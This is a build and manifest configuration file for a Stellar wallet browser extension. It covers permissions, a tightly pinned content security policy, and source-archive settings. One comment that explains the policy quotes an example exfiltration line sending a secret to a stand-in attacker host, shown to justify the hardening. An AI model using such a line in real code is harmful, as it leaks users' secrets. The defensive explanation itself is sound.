import { defineConfig } from 'wxt';
import tailwindcss from '@tailwindcss/vite';
import { nodePolyfills } from 'vite-plugin-node-polyfills';

// WXT config: one codebase -> Chrome MV3 and Firefox MV3 (ARCHITECTURE.md 1/2).
export default defineConfig({
  modules: ['@wxt-dev/module-react'],
  srcDir: '.',
  outDir: '.output',
  manifestVersion: 3,
  manifest: ({ browser }) => ({
    // Product name is never hardcoded in UI strings; this is the store listing name only.
    name: 'Aubergine',
    description: '__MSG_extDescription__',
    default_locale: 'en',
    version: '1.0.0',
    /**
     * Chrome refuses to install the package on anything older, instead of
     * installing it and breaking at runtime. 110 is not a guess: the Vite
     * build below targets `chrome110`, so anything below this line receives
     * syntax it cannot parse. A unit test binds the two together.
     * Firefox has no such key, its floor is `strict_min_version` below.
     */
    ...(browser === 'firefox' ? {} : { minimum_chrome_version: '110' }),
    // Invariant 3: no remote code. Invariant 4: no analytics endpoints.
    // `clipboardWrite` is deliberately absent: `navigator.clipboard.writeText`
    // from a focused extension page does not need it.
    permissions: [
      'storage',
      'alarms',
      'scripting', // invariant 7: dynamic content-script registration (developer mode only)
    ],
    /**
     * Install-time host access is exactly what beginner mode needs on day one
     * (§4 pins beginners to Testnet). Nothing else is granted up front.
     *
     * NOTE: `entrypoints/content.ts` must not declare `matches`, because WXT
     * lifts the matches of a runtime-registered content script into
     * `host_permissions`. The patterns live in `syncContentScriptRegistration`
     * only, and are requested at runtime via `chrome.permissions.request()`.
     */
    host_permissions: [
      'https://horizon-testnet.stellar.org/*',
      'https://soroban-testnet.stellar.org/*',
      'https://friendbot.stellar.org/*',
      // Soroswap aggregator API: second swap quote source (background broker
      // only, bearer-key auth, no user data beyond the quoted asset pair).
      'https://api.soroswap.finance/*',
    ],
    /**
     * Everything a developer-mode user opts into: other networks, a custom
     * endpoint (covered by the two wildcard patterns) and the dApp connector's
     * web access. Requested from a user gesture in Settings, never at install.
     */
    optional_host_permissions: [
      'https://horizon.stellar.org/*',
      // Mainnet Soroban RPC chain (src/core/stellar/networks.ts). Listed
      // individually even though `https://*/*` below already covers them: an
      // AMO/CWS reviewer reads this list, and `chrome.permissions.request()`
      // is called with these exact patterns.
      'https://rpc.lightsail.network/*',
      'https://mainnet.sorobanrpc.com/*',
      'https://soroban-rpc.mainnet.stellar.gateway.fm/*',
      'https://stellar-soroban-public.nodies.app/*',
      // Testnet Soroban RPC fallbacks (the SDF primary is granted at install).
      'https://soroban-rpc.testnet.stellar.gateway.fm/*',
      'https://stellar-soroban-testnet-public.nodies.app/*',
      // Alchemy Stellar RPC hosts, for a user-configured endpoint. The host
      // only; the account key is part of the URL path the user types in and
      // is stored locally, never in this file and never in the bundle.
      'https://stellar-mainnet.g.alchemy.com/*',
      'https://stellar-testnet.g.alchemy.com/*',
      'https://horizon-futurenet.stellar.org/*',
      'https://rpc-futurenet.stellar.org/*',
      'https://friendbot-futurenet.stellar.org/*',
      /**
       * Not a network endpoint: this is the WebAuthn relying-party ID for
       * passkey unlock. Chrome 122+/Firefox 150+ only let an extension claim
       * an RP ID for a domain it holds a host permission for, and
       * `chrome-extension://` cannot be one. Optional, so nobody pays for it
       * at install; requested from the click that enables the feature. See
       * `src/core/crypto/passkey.ts`.
       */
      'https://aubergine.tech/*',
      // The dApp connector's web access; developer mode only, requested from
      // a user gesture. Mirrors `DAPP_CONNECTOR_ORIGINS` in
      // `src/core/stellar/networks.ts` — `http://*/*` was dropped there on
      // purpose, the reason is on that constant.
      'https://*/*',
      'http://localhost/*',
      'http://127.0.0.1/*',
    ],
    /**
     * Toolbar icon. The PNGs live in `public/icon/{16,32,48,128}.png`; WXT
     * discovers them from the build output and writes the top-level `icons`
     * block itself (`discoverIcons()`), so the manifest can never point at a
     * file that was not emitted. `action.default_icon` is *not* derived from
     * that and has to be stated here, without it the browser falls back to a
     * generic puzzle piece, which for a wallet means a copycat extension is
     * visually indistinguishable in the toolbar, and the dApp badge painted by
     * `src/background/dapp.ts` sits on nothing. 128px is a Chrome Web Store
     * requirement.
     */
    action: {
      default_title: 'Aubergine',
      default_icon: {
        16: 'icon/16.png',
        32: 'icon/32.png',
        48: 'icon/48.png',
        128: 'icon/128.png',
      },
    },
    ...(browser === 'firefox'
      ? {
          browser_specific_settings: {
            gecko: {
              // Permanent after the first AMO upload: the old
              // `stellarwallet@example.org` used an IANA-reserved
              // documentation domain we can never prove ownership of.
              // Only the id changes here; the product rename is separate work.
              id: 'wallet@aubergine.tech',
              // 142, not 140: Desktop understands the data collection
              // declaration below from 140, but Firefox for Android only from
              // 142, and addons-linter warns on every upload while the two
              // disagree. The price is Desktop 140/141 and the ESR 140 branch.
              strict_min_version: '142.0',
              /**
               * AMO requires an explicit data collection declaration for all
               * new submissions since 2025-11-03 (Firefox Desktop 140+,
               * Android 142+). We collect nothing at all, invariant 4 forbids
               * telemetry, analytics and crash reporting outright.
               */
              data_collection_permissions: {
                required: ['none'],
              },
            },
          },
        }
      : {}),
    /**
     * P2 hardening: `connect-src` is pinned to the exact origins of the
     * built-in networks (see `src/core/stellar/networks.ts`, a unit test
     * keeps the two lists in sync) instead of the earlier blanket `https:`.
     * A compromised or buggy popup/background page can now only talk to
     * Horizon/Soroban/Friendbot, not exfiltrate to an arbitrary HTTPS host.
     *
     * That claim only holds with `default-src 'self'` in front of it. Without
     * it, every fetch directive the policy does not name is unrestricted, and
     * `new Image().src = 'https://evil.example/' + secret` exfiltrates just as
     * well as `fetch()` would, as do `@font-face`, `<video>`, `<iframe>` and
     * a remote `@import`. `default-src` is the backstop; the directives after
     * it only *narrow* it, never widen it:
     *
     *  - `style-src` adds `'unsafe-inline'` because the UI sets style
     *    attributes (`style={{ … }}`) and the dev server injects `<style>`
     *    blocks for HMR. This is not an exfiltration hole: CSS can only reach
     *    the network through `url()` / `@import` / `@font-face`, and those are
     *    governed by img-src / style-src / font-src, all pinned to 'self'.
     *  - `img-src` allows `data:`; a data URL cannot reach the network, so it
     *    does not weaken the claim above. The QR code on Receive is rendered as
     *    an inline `<svg><path>` and needs nothing here, but qrcode-generator's
     *    `createDataURL()` path is in the bundle and would otherwise be a trap.
     *  - `font-src 'self'`: Inter is shipped in `public/fonts/` (§7, no CDN).
     *  - `frame-src`/`object-src`/`form-action`: the popup embeds nothing and
     *    navigates nowhere; closing them removes navigation-based exfiltration
     *    if a form's `preventDefault()` is ever missed.
     *
     * THE MV3 LIMIT, stated plainly (v1.3). `content_security_policy` is a
     * manifest key. It is read once, when the extension is loaded, and MV3
     * offers no API that changes it afterwards, not `chrome.permissions`
     * (which grants host access, a separate check that does not touch the
     * CSP), not `declarativeNetRequest` (which rewrites request and response
     * headers, not the page's own policy), not `scripting`. A host the user
     * types into Settings at runtime therefore CANNOT be added to
     * `connect-src`. There is no trick here and we do not pretend otherwise.
     *
     * What that leaves is a choice between two honest options:
     *   (a) re-widen `connect-src` to a blanket `https:`, which gives back
     *       arbitrary-host exfiltration from a compromised popup, the exact
     *       hole the P2 hardening closed; or
     *   (b) name the providers we are willing to support up front and refuse
     *       anything else *at the point of entry*, with a message that says
     *       why.
     *
     * (b) is what this list is. The user-configurable endpoint (§4, the
     * `sorobanRpcOverride` setting) is checked against
     * `CSP_SOROBAN_ORIGINS` in `src/core/stellar/networks.ts` before it is
     * stored, so an unsupported host is a clear refusal in Settings instead of
     * a swap that dies on the mandatory path with a console error the user
     * never sees. The cost is real and worth writing down: supporting a new
     * RPC provider requires a new extension release. Adding an origin here
     * costs nothing but a store review; adding it *silently* is not possible,
     * which is the property we are buying.
     */
    content_security_policy: {
      extension_pages:
        "default-src 'self';" +
        " script-src 'self' 'wasm-unsafe-eval';" +
        " object-src 'self';" +
        " style-src 'self' 'unsafe-inline';" +
        " img-src 'self' data:;" +
        " font-src 'self';" +
        " frame-src 'none';" +
        " base-uri 'self';" +
        " form-action 'none';" +
        " connect-src 'self'" +
        ' https://horizon-testnet.stellar.org' +
        ' https://soroban-testnet.stellar.org' +
        ' https://friendbot.stellar.org' +
        ' https://horizon-futurenet.stellar.org' +
        ' https://rpc-futurenet.stellar.org' +
        ' https://friendbot-futurenet.stellar.org' +
        ' https://horizon.stellar.org' +
        // Mainnet Soroban RPC chain, in the order it is tried.
        ' https://rpc.lightsail.network' +
        ' https://mainnet.sorobanrpc.com' +
        ' https://soroban-rpc.mainnet.stellar.gateway.fm' +
        ' https://stellar-soroban-public.nodies.app' +
        // Testnet Soroban RPC fallbacks.
        ' https://soroban-rpc.testnet.stellar.gateway.fm' +
        ' https://stellar-soroban-testnet-public.nodies.app' +
        // Alchemy Stellar RPC hosts, origins only, so that a user-supplied
        // endpoint under one of them is reachable at all (see the note above).
        // No key is present here or anywhere else in the bundle.
        ' https://stellar-mainnet.g.alchemy.com' +
        ' https://stellar-testnet.g.alchemy.com' +
        // Soroswap aggregator API (swap quote source, background broker only).
        ' https://api.soroswap.finance' +
        ';',
    },
    /**
     * `inject.js` has to be reachable from the page, otherwise the content
     * script cannot hand `window.aubergine` to a dApp (§6). But a plain
     * entry is a wallet fingerprint: the extension id is fixed once published,
     * so *any* site can `fetch('chrome-extension://<id>/inject.js')` and learn
     * the wallet is installed, including beginner-mode users, who never
     * register a content script at all (invariant 7). `use_dynamic_url` makes
     * the browser serve the file under a per-session GUID that only our own
     * content script can resolve via `browser.runtime.getURL()`
     * (`entrypoints/content.ts`), which closes the probe.
     *
     * Chrome 110+ only. Firefox does not implement the key (and would only
     * warn about it in the AMO linter), but does not need it: every Firefox
     * install already serves the extension from a random per-profile
     * `moz-extension://<uuid>` origin, so the URL is unguessable there by
     * construction.
     */
    web_accessible_resources: [
      {
        resources: ['inject.js'],
        // Same set as `DAPP_CONNECTOR_ORIGINS`: `inject.js` has no business
        // being reachable from an origin the content script can never run on.
        matches: ['https://*/*', 'http://localhost/*', 'http://127.0.0.1/*'],
        ...(browser === 'firefox' ? {} : { use_dynamic_url: true }),
      },
    ],
  }),
  /**
   * The AMO source-code zip. A reviewer has to be able to reproduce the build
   * *and* run the tests from it; the defaults gave them neither.
   *
   * `dotSources` is what puts `.gitignore` and `.env.example` in the archive,
   * tinyglobby skips dotfiles otherwise, so the reviewer previously could not
   * even see which paths are generated. Everything hidden that must not ship
   * is denied explicitly below; `.env.local` (Soroswap API key) is first.
   */
  zip: {
    dotSources: true,
    excludeSources: [
      '.git',
      '.git/**',
      '.wxt',
      '.wxt/**',
      '.vscode',
      '.vscode/**',
      '.idea',
      '.idea/**',
      // Real secrets. `.env.example` is intentionally kept.
      '.env.local',
      '.env.*.local',
      // Playwright output, not source: ~2.6 MB of screenshots and traces that
      // were being shipped to Mozilla for no reason.
      'test-results',
      'test-results/**',
      'playwright-report',
      'playwright-report/**',
      'e2e-shots',
      'e2e-shots/**',
      'e2e/screenshots',
      'e2e/screenshots/**',
      '**/*.zip',
    ],
  },
  hooks: {
    /**
     * WXT hard-codes `**\/*.+(test|spec).?(c|m)+(j|t)s?(x)` and `__tests__`
     * into `excludeSources` and merges (never replaces) user patterns, so
     * `tests/*.test.ts` and `e2e/specs/*.spec.ts` were dropped from the source
     * zip. AMO asks reviewers to run the project's own test suite; handing
     * them a `package.json` whose `npm test` matches zero files is worse than
     * shipping no tests at all. This is the only place the two patterns can be
     * removed, because `zip()` reads the resolved array before any zip hook.
     */
    'config:resolved'(wxt) {
      const dropped = ['**/__tests__/**', '**/*.+(test|spec).?(c|m)+(j|t)s?(x)'];
      wxt.config.zip.excludeSources = wxt.config.zip.excludeSources.filter(
        (pattern) => !dropped.includes(pattern),
      );
    },
  },
  vite: () => ({
    plugins: [
      tailwindcss(),
      // @stellar/stellar-sdk still expects Node's Buffer/process globals.
      // Solved once, centrally, instead of dropping features (see task brief).
      nodePolyfills({
        include: ['buffer', 'process', 'util', 'stream', 'events'],
        globals: { Buffer: true, global: true, process: true },
        protocolImports: true,
      }),
    ],
    build: {
      target: 'chrome110',
      sourcemap: false,
    },
    define: {
      // Silences SDK checks for a Node environment.
      'process.env.NODE_DEBUG': 'false',
    },
  }),
});
